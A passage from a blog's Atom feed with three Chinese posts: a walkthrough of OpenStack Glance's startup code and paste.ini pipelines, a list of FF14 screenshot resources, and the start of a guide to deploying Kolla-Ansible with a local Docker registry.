class="line">wsgi_scripts &#x3D;</span><br><span class="line">    glance-wsgi-api &#x3D; glance.common.wsgi_app:init_app</span><br></pre></td></tr></table></figure><p>等号右边可以理解为调用的函数，以 <code>glance-api = glance.cmd.api:main</code> 为例，定位源码 glance/cmd/api.py 中的 main 函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        config.parse_args()             <span class="comment"># 读取配置</span></span><br><span class="line">        config.set_config_defaults()    <span class="comment"># 设置默认配置</span></span><br><span class="line">        wsgi.set_eventlet_hub()         <span class="comment"># 设置 eventlet.hub</span></span><br><span class="line">        logging.setup(CONF, <span class="string">&#x27;glance&#x27;</span>)   <span class="comment"># 日志</span></span><br><span class="line">        gmr.TextGuruMeditation.setup_autorun(version)</span><br><span class="line">        notifier.set_defaults()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> CONF.profiler.enabled: <span class="comment"># OSProfiler</span></span><br><span class="line">            osprofiler.initializer.init_from_conf(</span><br><span class="line">                conf=CONF,</span><br><span class="line">                context=&#123;&#125;,</span><br><span class="line">                project=<span class="string">&quot;glance&quot;</span>,</span><br><span class="line">                service=<span class="string">&quot;api&quot;</span>,</span><br><span class="line">                host=CONF.bind_host</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">        <span class="comment"># NOTE(danms): Configure system-wide threading model to use eventlet</span></span><br><span class="line">        glance.async_.set_threadpool_model(<span class="string">&#x27;eventlet&#x27;</span>) <span class="comment"># 设置同步线程池模型</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># NOTE(abhishekk): Added initialize_prefetcher KW argument to Server</span></span><br><span class="line">        <span class="comment"># object so that prefetcher object should only be initialized in case</span></span><br><span class="line">        <span class="comment"># of API service and ignored in case of registry. Once registry is</span></span><br><span class="line">        <span class="comment"># removed this parameter should be removed as well.</span></span><br><span class="line">        initialize_prefetcher = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> CONF.paste_deploy.flavor == <span class="string">&#x27;keystone+cachemanagement&#x27;</span>:</span><br><span class="line">            initialize_prefetcher = <span class="literal">True</span></span><br><span class="line">        server = wsgi.Server(initialize_glance_store=<span class="literal">True</span>,  <span class="comment"># wsgi 应用</span></span><br><span class="line">                             initialize_prefetcher=initialize_prefetcher)</span><br><span class="line">        server.start(config.load_paste_app(<span class="string">&#x27;glance-api&#x27;</span>), default_port=<span class="number">9292</span>) <span class="comment"># 启动 wsgi 应用</span></span><br><span class="line">        server.wait() <span class="comment"># 等待启动完成</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        fail(e)</span><br></pre></td></tr></table></figure><p>再来看一下 wsgi 脚本 <code>glance-wsgi-api = glance.common.wsgi_app:init_app</code>，定位源码 glance/common/wsgi_app.py 的 init_app 函数。重点关注的是最后使用 Paste Deploy 加载 wsgi 应用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_app</span>():</span></span><br><span class="line">    config.set_config_defaults()</span><br><span class="line">    config_files = _get_config_files()</span><br><span class="line">    CONF([], project=<span class="string">&#x27;glance&#x27;</span>, default_config_files=config_files)</span><br><span class="line">    logging.setup(CONF, <span class="string">&quot;glance&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># NOTE(danms): We are running inside uwsgi or mod_wsgi, so no eventlet;</span></span><br><span class="line">    <span class="comment"># use native threading instead.</span></span><br><span class="line">    glance.async_.set_threadpool_model(<span class="string">&#x27;native&#x27;</span>)</span><br><span class="line">    atexit.register(drain_threadpools)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># NOTE(danms): Change the default threadpool size since we</span></span><br><span class="line">    <span class="comment"># are dealing with native threads and not greenthreads.</span></span><br><span class="line">    <span class="comment"># Right now, the only pool of default size is tasks_pool,</span></span><br><span class="line">    <span class="comment"># so if others are created this will need to change to be</span></span><br><span class="line">    <span class="comment"># more specific.</span></span><br><span class="line">    common.DEFAULT_POOL_SIZE = CONF.wsgi.task_pool_threads</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> CONF.enabled_backends:</span><br><span class="line">        <span class="keyword">if</span> store_utils.check_reserved_stores(CONF.enabled_backends):</span><br><span class="line">            msg = _(<span class="string">&quot;&#x27;os_glance_&#x27; prefix should not be used in &quot;</span></span><br><span class="line">                    <span class="string">&quot;enabled_backends config option. It is reserved &quot;</span></span><br><span class="line">                    <span class="string">&quot;for internal use only.&quot;</span>)</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(msg)</span><br><span class="line">        glance_store.register_store_opts(CONF, reserved_stores=RESERVED_STORES)</span><br><span class="line">        glance_store.create_multi_stores(CONF, reserved_stores=RESERVED_STORES)</span><br><span class="line">        glance_store.verify_store()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        glance_store.register_opts(CONF)</span><br><span class="line">        glance_store.create_stores(CONF)</span><br><span class="line">        glance_store.verify_default_store()</span><br><span class="line"></span><br><span class="line">    run_staging_cleanup()</span><br><span class="line"></span><br><span class="line">    _setup_os_profiler()</span><br><span class="line">    <span class="keyword">return</span> config.load_paste_app(<span class="string">&#x27;glance-api&#x27;</span>)  <span class="comment"># Paste Deploy</span></span><br></pre></td></tr></table></figure><h2 id="paste-ini"><a href="#paste-ini" class="headerlink" title="paste.ini"></a>paste.ini</h2><p>paste.ini 文件是 wsgi 应用的配置文件，根据该文件可以知道应用程序是如何映射 URL 以及如何处理请求。</p><p>paste-ini 配置文件类似 ini 配置，每个 Section 的格式均为 <code>[type:name]</code> ，有以下几个小节</p><ul><li>  composite：收到请求后通过的第一个 Section，表示需要将 HTTP URL Request 调度到一个或者多个应用中</li><li>  app：实现主要功能的具体应用</li><li>  pipeline：过滤器管道，最后一个必须是 app 类型</li><li>  filter：实现过滤器功能的中间件，用于过滤请求和响应</li></ul><p>仍然以 glance 为例，启动 glance 服务时需要指定 paste.ini 配置文件，源码中的 etc/glance-api-paste.ini 配置文件如下：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Use this pipeline for no auth or image caching - DEFAULT</span></span><br><span class="line"><span class="section">[pipeline:glance-api]</span></span><br><span class="line"><span class="attr">pipeline</span> = cors healthcheck http_proxy_to_wsgi versionnegotiation osprofiler unauthenticated-context rootapp</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use this pipeline for image caching and no auth</span></span><br><span class="line"><span class="section">[pipeline:glance-api-caching]</span></span><br><span class="line"><span class="attr">pipeline</span> = cors healthcheck http_proxy_to_wsgi versionnegotiation osprofiler unauthenticated-context cache rootapp</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use this pipeline for caching w/ management interface but no auth</span></span><br><span class="line"><span class="section">[pipeline:glance-api-cachemanagement]</span></span><br><span class="line"><span class="attr">pipeline</span> = cors healthcheck http_proxy_to_wsgi versionnegotiation osprofiler unauthenticated-context cache cachemanage rootapp</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use this pipeline for keystone auth</span></span><br><span class="line"><span class="section">[pipeline:glance-api-keystone]</span></span><br><span class="line"><span class="attr">pipeline</span> = cors healthcheck http_proxy_to_wsgi versionnegotiation osprofiler authtoken context  rootapp</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use this pipeline for keystone auth with image caching</span></span><br><span class="line"><span class="section">[pipeline:glance-api-keystone+caching]</span></span><br><span class="line"><span class="attr">pipeline</span> = cors healthcheck http_proxy_to_wsgi versionnegotiation osprofiler authtoken context cache rootapp</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use this pipeline for keystone auth with caching and cache management</span></span><br><span class="line"><span class="section">[pipeline:glance-api-keystone+cachemanagement]</span></span><br><span class="line"><span class="attr">pipeline</span> = cors healthcheck http_proxy_to_wsgi versionnegotiation osprofiler authtoken context cache cachemanage rootapp</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use this pipeline for authZ only. This means that the registry will treat a</span></span><br><span class="line"><span class="comment"># user as authenticated without making requests to keystone to reauthenticate</span></span><br><span class="line"><span class="comment"># the user.</span></span><br><span class="line"><span class="section">[pipeline:glance-api-trusted-auth]</span></span><br><span class="line"><span class="attr">pipeline</span> = cors healthcheck http_proxy_to_wsgi versionnegotiation osprofiler context rootapp</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use this pipeline for authZ only. This means that the registry will treat a</span></span><br><span class="line"><span class="comment"># user as authenticated without making requests to keystone to reauthenticate</span></span><br><span class="line"><span class="comment"># the user and uses cache management</span></span><br><span class="line"><span class="section">[pipeline:glance-api-trusted-auth+cachemanagement]</span></span><br><span class="line"><span class="attr">pipeline</span> = cors healthcheck http_proxy_to_wsgi versionnegotiation osprofiler context cache cachemanage rootapp</span><br><span class="line"></span><br><span class="line"><span class="section">[composite:rootapp]</span></span><br><span class="line"><span class="attr">paste.composite_factory</span> = glance.api:root_app_factory</span><br><span class="line">/: apiversions</span><br><span class="line">/v2: apiv2app</span><br><span class="line"></span><br><span class="line"><span class="section">[app:apiversions]</span></span><br><span class="line"><span class="attr">paste.app_factory</span> = glance.api.versions:create_resource</span><br><span class="line"></span><br><span class="line"><span class="section">[app:apiv2app]</span></span><br><span class="line"><span class="attr">paste.app_factory</span> = glance.api.v2.router:API.factory</span><br><span class="line"></span><br><span class="line"><span class="section">[filter:healthcheck]</span></span><br><span class="line"><span class="attr">paste.filter_factory</span> = oslo_middleware:Healthcheck.factory</span><br><span class="line"><span class="attr">backends</span> = disable_by_file</span><br><span class="line"><span class="attr">disable_by_file_path</span> = /etc/glance/healthcheck_disable</span><br><span class="line"></span><br><span class="line"><span class="section">[filter:versionnegotiation]</span></span><br><span class="line"><span class="attr">paste.filter_factory</span> = glance.api.middleware.version_negotiation:VersionNegotiationFilter.factory</span><br><span class="line"></span><br><span class="line"><span class="section">[filter:cache]</span></span><br><span class="line"><span class="attr">paste.filter_factory</span> = glance.api.middleware.cache:CacheFilter.factory</span><br><span class="line"></span><br><span class="line"><span class="section">[filter:cachemanage]</span></span><br><span class="line"><span class="attr">paste.filter_factory</span> = glance.api.middleware.cache_manage:CacheManageFilter.factory</span><br><span class="line"></span><br><span class="line"><span class="section">[filter:context]</span></span><br><span class="line"><span class="attr">paste.filter_factory</span> = glance.api.middleware.context:ContextMiddleware.factory</span><br><span class="line"></span><br><span class="line"><span class="section">[filter:unauthenticated-context]</span></span><br><span class="line"><span class="attr">paste.filter_factory</span> = glance.api.middleware.context:UnauthenticatedContextMiddleware.factory</span><br><span class="line"></span><br><span class="line"><span class="section">[filter:authtoken]</span></span><br><span class="line"><span class="attr">paste.filter_factory</span> = keystonemiddleware.auth_token:filter_factory</span><br><span class="line"><span class="attr">delay_auth_decision</span> = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="section">[filter:gzip]</span></span><br><span class="line"><span class="attr">paste.filter_factory</span> = glance.api.middleware.gzip:GzipMiddleware.factory</span><br><span class="line"></span><br><span class="line"><span class="section">[filter:osprofiler]</span></span><br><span class="line"><span class="attr">paste.filter_factory</span> = osprofiler.web:WsgiMiddleware.factory</span><br><span class="line"><span class="attr">hmac_keys</span> = SECRET_KEY  <span class="comment">#DEPRECATED</span></span><br><span class="line"><span class="attr">enabled</span> = <span class="literal">yes</span>  <span class="comment">#DEPRECATED</span></span><br><span class="line"></span><br><span class="line"><span class="section">[filter:cors]</span></span><br><span class="line"><span class="attr">paste.filter_factory</span> =  oslo_middleware.cors:filter_factory</span><br><span class="line"><span class="attr">oslo_config_project</span> = glance</span><br><span class="line"><span class="attr">oslo_config_program</span> = glance-api</span><br><span class="line"></span><br><span class="line"><span class="section">[filter:http_proxy_to_wsgi]</span></span><br><span class="line"><span class="attr">paste.filter_factory</span> = oslo_middleware:HTTPProxyToWSGI.factory</span><br></pre></td></tr></table></figure><p>可以看到 pipeline 最后的总是 rootapp 应用，<code>paste.composite_factory</code> 设置应用的工厂函数</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[composite:rootapp]</span></span><br><span class="line"><span class="attr">paste.composite_factory</span> = glance.api:root_app_factory</span><br><span class="line">/: apiversions</span><br><span class="line">/v2: apiv2app</span><br></pre></td></tr></table></figure><p>定位源码 glance/api.py 的 root_app_factory 函数，显然是用于设置 url 映射的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">root_app_factory</span>(<span class="params">loader, global_conf, **local_conf</span>):</span></span><br><span class="line">    <span class="keyword">return</span> paste.urlmap.urlmap_factory(loader, global_conf, **local_conf)</span><br></pre></td></tr></table></figure><p>由于我主要关注的是服务的启动方式，因此 URL 映射具体是如何实现的并没有了解。通过 paste.ini 文件可以知道请求到达真正的应用前经过了什么中间件（过滤器）的处理，这些中间件的源码也可以看一看。</p><h1 id="参阅"><a href="#参阅" class="headerlink" title="参阅"></a>参阅</h1><ul><li><a href="https://docs.openstack.org/glance/latest/admin/apache-httpd.html">Running Glance in HTTPD</a></li><li><a href="https://pastedeploy.readthedocs.io/en/latest/">Paste Deployment</a></li><li><a href="https://blog.csdn.net/Jmilk/article/details/52081748">Openstack Paste.ini 文件详解</a></li></ul>]]></content>
    
    
    <summary type="html">通过 setup.cfg 配置文件找到组件服务的启动入口</summary>
    
    
    
    <category term="OpenStack" scheme="https://jckling.github.io/categories/OpenStack/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>FF14 光之摄影师养成计划✨</title>
    <link href="https://jckling.github.io/2021/06/24/Game/FFXIV/FF14-%E5%85%89%E4%B9%8B%E6%91%84%E5%BD%B1%E5%B8%88%E5%85%BB%E6%88%90%E8%AE%A1%E5%88%92/"/>
    <id>https://jckling.github.io/2021/06/24/Game/FFXIV/FF14-%E5%85%89%E4%B9%8B%E6%91%84%E5%BD%B1%E5%B8%88%E5%85%BB%E6%88%90%E8%AE%A1%E5%88%92/</id>
    <published>2021-06-24T08:11:35.000Z</published>
    <updated>2021-09-13T13:06:00.000Z</updated>
    
    <content type="html"><![CDATA[<div class="note primary flat"><p>🕹️ 招待码 <code>0295-a3be-vax6-04fv</code>，<a href="https://ff.web.sdo.com/entertain">登陆页面</a> 点击【被招待者】，在页面上输入招待码，马上结成招待关系！</p></div><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>陆陆续续存了不少截图相关的链接，虽然没有都看过xd</p><p>趁着摸鱼的时候稍微理一理。</p><h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><h2 id="NGA"><a href="#NGA" class="headerlink" title="NGA"></a>NGA</h2><p><strong><a href="https://bbs.nga.cn/thread.php?key=%5B%E5%B9%BB%E5%8C%96%E6%B0%B5%5D&fid=-362960">NGA 搜索 - 幻化氵</a></strong><br>搜索 <code>幻化</code> 或 <code>幻化氵</code> 查找相关帖子</p><p><strong><a href="https://bbs.nga.cn/read.php?tid=20459393">[幻化外观整理] 人偶兵装使用说明书</a></strong><br>装备一览，包括套装、武器等，给出了装备的出处</p><p><strong><a href="https://bbs.nga.cn/read.php?tid=16198912">[FF143Areal补丁联动]拍照打光教程</a></strong><br>打光教程，平时用的 GShade 不是 3Areal，打光可以学习</p><p><strong><a href="https://bbs.nga.cn/read.php?tid=14869355">[光之暖暖][投影][幻化]如何找外观，获得、预览外观，看买家秀</a></strong><br>如题</p><p><strong><a href="https://bbs.nga.cn/read.php?tid=12931368">[光之摄影] 迟到而冗长的打光练习课</a></strong><br>时间比较早的一个打光教程</p><h2 id="微博"><a href="#微博" class="headerlink" title="微博"></a>微博</h2><p><strong><a href="https://weibo.com/u/2448465132?sudaref=bbs.nga.cn&is_all=1">最终幻想14_秘银之眼杂志社</a></strong><br>只接受多图投稿，我感觉大多都是精修啊x</p><p><strong><a href="https://weibo.com/ffxivnge?refer_flag=1005055013_&is_all=1">艾欧泽亚地理频道</a></strong><br>貌似主要是场景摄影，质量都很高（一直都不知道是怎么拍的qwq）</p><p><strong><a href="https://weibo.com/u/6532495419?refer_flag=1005055013_&is_all=1">今天有人男吸吗</a></strong><br>人男 bot，不要 cos 号（悄悄</p><p><strong><a href="https://weibo.com/u/7643695382">最终幻想14敖龙族男性bot</a></strong><br>龙男 bot，好腰好腰，好帅好帅</p><p><strong><a href="https://weibo.com/u/5308654606">猫男bot</a></strong><br>猫男 bot，《大慈大悲》-佣兵头-指挥官（才不是偏见呢！）</p><p><strong><a href="https://weibo.com/u/6410821334?refer_flag=1005055013_&is_all=1">艾欧泽亚投影图鉴</a></strong><br>每天精选一些鉴赏站点 <a href="https://mirapri.com/">MIRAPRI SNAP</a> 上的幻化搭配，同时接受玩家投稿</p><hr><p>大家分享的截图场景，当然也推荐关注这些用户啦~</p><ul><li><a href="https://weibo.com/ttarticle/p/show?id=2309404649531215052981#_0">FF14个人常用截图地点分享-1</a></li><li><a href="https://weibo.com/3181607480/KiF9aD8TT?type=comment#_rnd1624526720401">Gshade 滤镜分享</a></li><li><a href="https://weibo.com/ttarticle/p/show?id=2309404634681193923044#_0">【FF14】Mia的截图地点整理（6）</a></li><li><a href="https://weibo.com/ttarticle/p/show?id=2309404648464289235597#_0">【Gshade】简单的预设安利2+使用进阶</a></li></ul><h2 id="鉴赏站点"><a href="#鉴赏站点" class="headerlink" title="鉴赏站点"></a>鉴赏站点</h2><p><strong><a href="https://www.ffxivcollection.com/">FFXIV ARMOURY COLLECTION</a></strong><br>和人偶兵装相同，游戏套装展示</p><p><strong><a href="https://mirapri.com/">MIRAPRI SNAP</a></strong><br>玩家幻化投稿（日文）</p><p><strong><a href="https://www.ffxivsc.cn/">光之收藏家</a></strong><br>玩家幻化投稿（中文）</p><p><strong><a href="https://ffxiv.eorzeacollection.com/">Eorzea Collection</a></strong><br><a href="https://ffxiv.eorzeacollection.com/gearsets">gearsets</a> 也是游戏套装展示，<a href="https://ffxiv.eorzeacollection.com/glamours">glamours</a> 是玩家投稿</p><h1 id="Discord-群组"><a href="#Discord-群组" class="headerlink" title="Discord 群组"></a>Discord 群组</h1><p><strong><a href="https://discord.gg/thncM4An">GPOSERS</a></strong><br>Gshade 官方群组，可以在里面提问和分享截图</p><p><strong><a href="https://discord.gg/ffxivtextools">FFXIV TEXTOOLS &amp; MODDING</a></strong><br>TexTools 官方群组，有模型和玩家截图的分享</p><p><strong><a href="https://discord.gg/xivmalemods">FFXIV MALE MODS</a></strong><br>TexTools 模型分享，也有玩家截图分享</p><p><strong><a href="https://discord.gg/crystallinemeans">THE Crystalline Means</a></strong><br>CMTool 官方群组，可以在里面提问和分享截图</p><h1 id="TBC"><a href="#TBC" class="headerlink" title="TBC"></a>TBC</h1>]]></content>
    
    
    <summary type="html">摸鱼时收集的截图技巧链接整理(･ω&lt;)☆</summary>
    
    
    
    <category term="Game" scheme="https://jckling.github.io/categories/Game/"/>
    
    
    <category term="FFXIV" scheme="https://jckling.github.io/tags/FFXIV/"/>
    
  </entry>
  
  <entry>
    <title>Kolla-Ansible 本地仓库部署</title>
    <link href="https://jckling.github.io/2021/06/14/OpenStack/Kolla-Ansible%20%E6%9C%AC%E5%9C%B0%E4%BB%93%E5%BA%93%E9%83%A8%E7%BD%B2/"/>
    <id>https://jckling.github.io/2021/06/14/OpenStack/Kolla-Ansible%20%E6%9C%AC%E5%9C%B0%E4%BB%93%E5%BA%93%E9%83%A8%E7%BD%B2/</id>
    <published>2021-06-14T13:17:43.000Z</published>
    <updated>2021-06-30T00:51:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>在 <a href="https://jckling.github.io/2021/05/31/OpenStack/OpenStack%20%E5%8D%95%E6%9C%BA%E9%83%A8%E7%BD%B2%20%E2%80%94%E2%80%94%20Kolla-Ansible/">OpenStack 单机部署 —— Kolla-Ansible</a> 的基础上，改用本地镜像仓库，从源码构建镜像并部署 OpenStack all-in-one。</p><h1 id="部署本地仓库-Docker-Registry"><a href="#部署本地仓库-Docker-Registry" class="headerlink" title="部署本地仓库 Docker Registry"></a>部署本地仓库 Docker Registry</h1><p><code>kolla-ansible -i all-in-one bootstrap-servers</code> 会改变 docker 的网络配置，需要删除桥接配置，即启用桥接，否则构建镜像的过程中无法下载依赖库。</p><p>另外，还可以添加国内的镜像源，最终 /etc/docker/daemon.json 配置文件的内容如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;registry-mirrors&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;http://hub-mirror.c.163.com&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;insecure-registries&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;10.112.247.246:4000&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;iptables&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">&quot;log-opts&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;max-file&quot;</span>: <span class="string">&quot;5&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;max-size&quot;</span>: <span class="string">&quot;50m&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改配置文件后需要重启 docker 服务。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># docker 网络配置</span></span><br><span class="line">sudo vim /etc/docker/daemon.json</span><br><span class="line"><span class="comment"># 删除 bridge: &quot;none&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启 docker 服务</span></span><br><span class="line">sudo service docker restart</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将当前用户加入 docker 用户组</span></span><br><span class="line">sudo usermod -aG docker <span class="variable">$USER</span></span><br><span class="line">newgrp docker</span><br></pre></td></tr></table></figure><p>运行本地镜像仓库，由于 Keystone 使用了 5000 端口，因此这里指定映射到 4000 端口。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 本地镜像仓库</span></span><br><span class="line">docker run -d \</span><br><span class="line"> --name registry \</span><br><span class="line"> --restart=always \</span><br><span class="line"> -p 4000:5000 \</span><br><span class="line"> -v registry:/var/lib/registry \</span><br><span class="line"> registry:2</span><br></pre></td></tr></table></figure><h1 id="使用本地仓库"><a href="#使用本地仓库" class="headerlink" title="使用本地仓库"></a>使用本地仓库</h1><p>使用 tox 创建配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装 tox</span></span><br><span class="line">pip install tox</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成配置文件</span></span><br><span class="line"><span class="built_in">cd</span> kolla</span><br><span class="line">tox -e genconfig</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拷贝配置文件</span></span><br><span class="line">sudo cp etc/kolla/kolla-build.conf /etc/kolla/</span><br></pre></td></tr></table></figure><p>下载 Keystone 源码，指定 Victoria 版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载源码</span></span><br><span class="line"><span class="built_in">cd</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/keystone.git --branch stable/victoria --single-branch</span><br></pre></td></tr></table></figure><p>修改配置文件，假设本机 ip 为 10.1.0.240，openstack_release 有要求（随便填会出错）</p><ul><li>默认构建的镜像被打上了 <code>12.1.0</code> 的标签，这里的 openstack_release 需要指定 registry 中存在的标签</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 配置源码路径</span></span><br><span class="line">sudo vim /etc/kolla/kolla-build.conf</span><br><span class="line"><span class="comment">#[DEFAULT]</span></span><br><span class="line"><span class="comment">#base = ubuntu</span></span><br><span class="line"><span class="comment">#network_mode = host</span></span><br><span class="line"><span class="comment">#push = true</span></span><br><span class="line"><span class="comment">#registry = 10.1.0.240:4000</span></span><br><span class="line"><span class="comment">#[keystone-base]</span></span><br><span class="line"><span class="comment">#type = local</span></span><br><span class="line"><span class="comment">#location = /home/jck/keystone</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用本地仓库</span></span><br><span class="line">sudo vim /etc/kolla/globals.yml</span><br><span class="line"><span class="comment">#docker_registry: 10.1.0.240:4000</span></span><br><span class="line"><span class="comment">#openstack_release: &quot;12.1.0&quot;</span></span><br></pre></td></tr></table></figure><p>构建镜像，使用 <code>&amp;&gt;</code> 将输出重定向到文件中</p><figure class="highlight bash"><table><tr><td 